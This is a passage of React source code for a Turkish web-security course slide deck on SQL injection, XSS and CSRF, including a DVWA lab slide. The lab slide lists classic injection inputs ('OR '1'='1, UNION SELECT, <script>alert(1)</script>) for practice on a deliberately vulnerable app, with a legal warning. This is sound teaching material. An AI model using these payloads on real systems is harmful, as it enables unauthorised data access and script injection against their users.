              <c.icon className="w-5 h-5" style={{ color: c.color }} />
            </div>
            <div>
              <div className="text-base font-semibold text-white mb-1">{c.title}</div>
              <p className="text-sm text-gray-400 leading-relaxed">{c.desc}</p>
            </div>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 12. Bölüm 3 — CSRF ───── */
  () => (
    <SectionDivider
      num="03"
      total="03"
      title="CSRF"
      subtitle="Cross-Site Request Forgery: kurbanın açık oturumu, onun haberi olmadan istek dışı bir işlem yaptırmak için kullanılır."
      bgGradient="linear-gradient(135deg,#ef4444,#7f1d1d)"
      shadow="0 30px 80px -20px rgba(239,68,68,0.55)"
      icon={<Cookie className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 13. CSRF akışı ───── */
  () => (
    <SlideShell>
      <Eyebrow>CSRF · saldırı akışı</Eyebrow>
      <H2 className="mb-2">Senin oturmanı kullanarak senin adına işlem</H2>
      <Sub className="max-w-3xl mb-6">
        CSRF, XSS&apos;in tersidir: kod çalıştırmaz, <span className="text-white">güveni</span>
        kullanır. Tarayıcının çerezi otomatik eklemesi (ambient authority), token kontrolü yoksa
        saldırgan için yeterlidir.
      </Sub>
      <CsrfMockup />
    </SlideShell>
  ),

  /* ───── 14. SQLi vs XSS vs CSRF karşılaştırma ───── */
  () => (
    <SlideShell>
      <Eyebrow>Üçünü yan yana koy</Eyebrow>
      <H2>Hedef, mekanizma ve birincil savunma</H2>
      <Sub className="mt-3 max-w-3xl">
        Üçü de &quot;girdiye güven&quot; ailesinden ama tamamen farklı yerlere vururlar. Karıştırmamak
        için tek tabloda:
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 0.6 }}
        className="mt-6 sgbh-card rounded-xl p-1"
      >
        <table className="sgbh-tbl">
          <thead>
            <tr>
              <th style={{ width: "14%" }}>Açık</th>
              <th style={{ width: "20%" }}>Hedef</th>
              <th style={{ width: "33%" }}>Mekanizma</th>
              <th>Birincil savunma</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><span className="sgbh-pill sgbh-pill-c">SQLi</span></td>
              <td className="text-white">Veritabanı (sunucu)</td>
              <td>Girdi SQL sorgusuna kod olarak karışır.</td>
              <td><span className="text-[#86efac]">Parametreli sorgu</span> + en az yetki.</td>
            </tr>
            <tr>
              <td><span className="sgbh-pill" style={{ background: "rgba(251,191,36,0.15)", color: "#fcd34d", border: "1px solid rgba(251,191,36,0.3)" }}>XSS</span></td>
              <td className="text-white">Diğer kullanıcının tarayıcısı</td>
              <td>Saldırgan script&apos;i sayfada çalışır.</td>
              <td><span className="text-[#86efac]">Çıktı kodlama</span> + CSP + HttpOnly.</td>
            </tr>
            <tr>
              <td><span className="sgbh-pill" style={{ background: "rgba(239,68,68,0.15)", color: "#fca5a5", border: "1px solid rgba(239,68,68,0.3)" }}>CSRF</span></td>
              <td className="text-white">Kurbanın açık oturumu</td>
              <td>Tarayıcı çerezi otomatik ekler; istek sahte sayfadan gelir.</td>
              <td><span className="text-[#86efac]">Anti-CSRF token</span> + SameSite çerez.</td>
            </tr>
          </tbody>
        </table>
      </motion.div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.8 }}
        className="mt-4 text-[11px] text-gray-500 font-mono"
      >
        Hafıza kancası: SQLi sunucuya, XSS kullanıcıya, CSRF oturuma saldırır.
      </motion.div>
    </SlideShell>
  ),

  /* ───── 15. Uygulamalı lab — DVWA ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bu hafta · uygulamalı lab (DVWA)</Eyebrow>
      <H2 className="mb-2">Kontrollü ortamda dört adım</H2>
      <Sub className="max-w-3xl mb-6">
        DVWA (Damn Vulnerable Web Application) kasıtlı olarak savunmasız bir uygulamadır;
        kendi makinende, izole çalıştırılır. Aşağıda labı ayağa kaldırma; sonra dört görev.
      </Sub>
      <DvwaTerminal />
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mt-5">
        {[
          { icon: Database, title: "1 · SQLi (Low)", desc: "&apos; OR &apos;1&apos;=&apos;1 ile auth bypass dene; ardından UNION SELECT ile kullanıcı tablosunu çek.", accent: "#06b6d4" },
          { icon: Code, title: "2 · Stored XSS", desc: "Guestbook&apos;a &lt;script&gt;alert(1)&lt;/script&gt; gir; sayfayı tekrar açınca tetiklendiğini gör.", accent: "#fbbf24" },
          { icon: Cookie, title: "3 · CSRF", desc: "Parola değiştirme isteğini incele; token olmadığını ve dışarıdan tetiklenebildiğini doğrula.", accent: "#f87171" },
          { icon: ShieldCheck, title: "4 · Seviyeyi yükselt", desc: "Security level&apos;i Medium/High yap; aynı payload&apos;lar neden artık çalışmıyor, yaz.", accent: "#34d399" },
        ].map((t, i) => (
          <motion.div
            key={t.title}
            initial={{ opacity: 0, x: i % 2 === 0 ? -20 : 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.2 + i * 0.1 }}
            className="sgbh-card sgbh-card-hover rounded-xl p-4 flex items-start gap-3"
          >
            <div
              className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ background: `${t.accent}18`, border: `1px solid ${t.accent}55` }}
            >
              <t.icon className="w-5 h-5" style={{ color: t.accent }} />
            </div>
            <div>
              <div className="text-sm font-semibold text-white mb-0.5">{t.title}</div>
              <p className="text-[12px] text-gray-400 leading-relaxed">{t.desc}</p>
            </div>
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-5 sgbh-card-warn rounded-lg px-4 py-3 text-xs text-gray-300 flex items-start gap-3 max-w-4xl"
      >
        <AlertTriangle className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          <span className="text-white">Yalnızca kendi izole labında.</span> Aynı yükleri sana ait
          olmayan bir siteye denemek TCK 243-245 kapsamında suçtur. DVWA bu yüzden var: yasal,
          tekrarlanabilir, güvenli bir alan.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 16. Hafta 5 önizleme + kapanış ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.7 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7 }}
          className="inline-flex w-24 h-24 rounded-2xl items-center justify-center mb-8"
          style={{ background: "linear-gradient(135deg,#06b6d4,#0e7490)", boxShadow: "0 30px 80px -20px rgba(6,182,212,0.6)" }}
        >
          <ShieldCheck className="w-12 h-12 text-white" />
        </motion.div>
        <Eyebrow>4. hafta tamamlandı · sıradaki: OWASP Top 10 — Bölüm 2</Eyebrow>
        <H1>
          <span className="sgbh-shimmer-soft">Yetki, Konfigürasyon &amp; Bileşen Açıkları</span>
        </H1>
        <Sub className="mt-6 max-w-2xl mx-auto">
          Bu hafta girdiye güvenin sonuçlarını gördük. Hafta 5&apos;te listenin diğer ucuna geçiyoruz:
          Broken Access Control, Security Misconfiguration ve Vulnerable Components — yine DVWA ve
          gerçek vakalarla.
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10 max-w-3xl mx-auto">
          <FeatureCard icon={Layers} title="Access Control" desc="IDOR, yatay/dikey hak yükseltme; A01." accent="#06b6d4" delay={0.1} />
          <FeatureCard icon={Server} title="Misconfiguration" desc="Varsayılan parola, açık panel, geniş izin; A05." accent="#fbbf24" delay={0.18} />
          <FeatureCard icon={Bug} title="Vulnerable Components" desc="Yamalanmamış kütüphane; log4shell vakası; A06." accent="#f87171" delay={0.26} />
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10 max-w-3xl mx-auto text-left">
          <div className="sgbh-card rounded-xl p-5">
            <Calendar className="w-5 h-5 text-[#06b6d4] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Ders saati</div>
            <div className="text-white font-semibold">Çarşamba</div>
            <div className="text-sm text-gray-400">13:30 — 17:00</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Target className="w-5 h-5 text-[#a78bfa] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Hazırlık</div>
            <div className="text-white font-semibold">DVWA + Burp</div>
            <div className="text-sm text-gray-400">kurulu ve çalışır getir</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Brain className="w-5 h-5 text-[#34d399] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Teslim</div>
            <div className="text-white font-semibold">Lab raporu</div>
            <div className="text-sm text-gray-400">4 görev + ekran görüntüsü</div>
          </div>
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-10 text-xs font-mono text-gray-600 flex items-center justify-center gap-2"
        >
          <Sparkles className="w-3.5 h-3.5" />
          <span>Yükleri yalnızca kendi izole labında dene · izin sınırı çizer</span>
        </motion.div>
      </div>
    </SlideShell>
  ),
];

const TOTAL = slides.length;

/* ============================================================
   PRESENTATION ROOT
   ============================================================ */

export default function Presentation() {
  const [current, setCurrent] = useState(0);
  const [direction, setDirection] = useState(1);
  const [isFs, setIsFs] = useState(false);

  const next = useCallback(() => {
    setDirection(1);
    setCurrent((c) => Math.min(c + 1, TOTAL - 1));
  }, []);
  const prev = useCallback(() => {
    setDirection(-1);
    setCurrent((c) => Math.max(c - 1, 0));
  }, []);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "ArrowRight" || e.key === " " || e.key === "PageDown") {
        e.preventDefault();
        next();
      } else if (e.key === "ArrowLeft" || e.key === "PageUp") {
        e.preventDefault();
        prev();
      } else if (e.key.toLowerCase() === "f") {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen?.();
        } else {
          document.exitFullscreen?.();
        }
      } else if (e.key === "Home") {
        setDirection(-1);
        setCurrent(0);
      } else if (e.key === "End") {
        setDirection(1);
        setCurrent(TOTAL - 1);
      }
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [next, prev]);

  useEffect(() => {
    function onFs() {
      setIsFs(Boolean(document.fullscreenElement));
    }
    document.addEventListener("fullscreenchange", onFs);
    return () => document.removeEventListener("fullscreenchange", onFs);
  }, []);

  const touch = useRef<{ x: number } | null>(null);

  const slideContent = slides[current](true);
  const progress = ((current + 1) / TOTAL) * 100;

  return (
    <div
      className="fixed inset-0 bg-black overflow-hidden text-white"
      onTouchStart={(e) => {
        touch.current = { x: e.touches[0].clientX };
      }}
      onTouchEnd={(e) => {
        if (!touch.current) return;
        const dx = e.changedTouches[0].clientX - touch.current.x;
        if (Math.abs(dx) > 60) (dx > 0 ? prev : next)();
        touch.current = null;
      }}
    >
      <div className="absolute top-0 left-0 right-0 h-[3px] bg-white/5 z-50">
        <motion.div
          className="h-full"
          style={{
            background: "linear-gradient(90deg, #06b6d4, #67e8f9, #06b6d4)",
            boxShadow: "0 0 16px rgba(6,182,212,0.6)",
          }}
          animate={{ width: `${progress}%` }}
          transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
        />
      </div>

      <div className="absolute top-0 left-0 right-0 z-40 flex items-center justify-between px-8 py-4 text-[10px] font-mono uppercase tracking-wider">
        <div className="text-[#06b6d4]/70">
          BVA 2205 · 4. Hafta · OWASP Top 10 (SQLi · XSS · CSRF)
        </div>
        <div className="flex items-center gap-3">
          <div className="text-[#06b6d4]/50">
            <span className="text-[#06b6d4]">
              {String(current + 1).padStart(2, "0")}
            </span>
            <span className="mx-1">/</span>
            {String(TOTAL).padStart(2, "0")}
          </div>
          <button
            onClick={() => {
              if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen?.();
              } else {
                document.exitFullscreen?.();
              }
            }}
            className="p-1.5 text-gray-500 hover:text-[#06b6d4] transition-colors"
            aria-label="Tam ekran"
          >
            {isFs ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
          </button>
        </div>
      </div>

      <AnimatePresence mode="wait" custom={direction}>
        <motion.div
          key={current}
          custom={direction}
          initial={{ opacity: 0, x: direction * 60 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -direction * 30 }}
          transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
          className="absolute inset-0"
        >
          {slideContent}
        </motion.div>
      </AnimatePresence>

      <button
        onClick={prev}
        disabled={current === 0}
        aria-label="Önceki slayt"
        className="absolute left-0 top-12 bottom-16 w-[12%] z-30 cursor-w-resize disabled:cursor-default opacity-0"
      />
      <button
        onClick={next}
        disabled={current === TOTAL - 1}
        aria-label="Sonraki slayt"
        className="absolute right-0 top-12 bottom-16 w-[12%] z-30 cursor-e-resize disabled:cursor-default opacity-0"
      />

      <div className="absolute bottom-0 left-0 right-0 z-40 px-8 py-4 flex items-center justify-between border-t border-white/5 bg-black/60 backdrop-blur">
        <button
          onClick={prev}
          disabled={current === 0}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          <ChevronLeft className="w-4 h-4" />
          Önceki
        </button>
        <div className="flex items-center gap-1 max-w-[60%] overflow-hidden">
          {Array.from({ length: TOTAL }).map((_, i) => (
            <button
              key={i}
              onClick={() => {
                setDirection(i > current ? 1 : -1);
                setCurrent(i);
              }}
              aria-label={`Slayt ${i + 1}`}
              className={`h-1.5 rounded-full transition-all ${
                i === current
                  ? "w-5 bg-[#06b6d4]"
                  : "w-1.5 bg-white/15 hover:bg-white/40"
              }`}
              style={
                i === current
                  ? { boxShadow: "0 0 10px rgba(6,182,212,0.6)" }
                  : undefined
              }
            />
          ))}
        </div>
        <button
          onClick={next}
          disabled={current === TOTAL - 1}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          Sonraki
          <ChevronRight className="w-4 h-4" />
        </button>
      </div>

      <div className="absolute bottom-3 right-8 text-[9px] font-mono text-gray-700 z-50 hidden md:flex items-center gap-2">
        <Keyboard className="w-3 h-3" />
        <span>← → · F · Esc</span>
      </div>
    </div>
  );
}
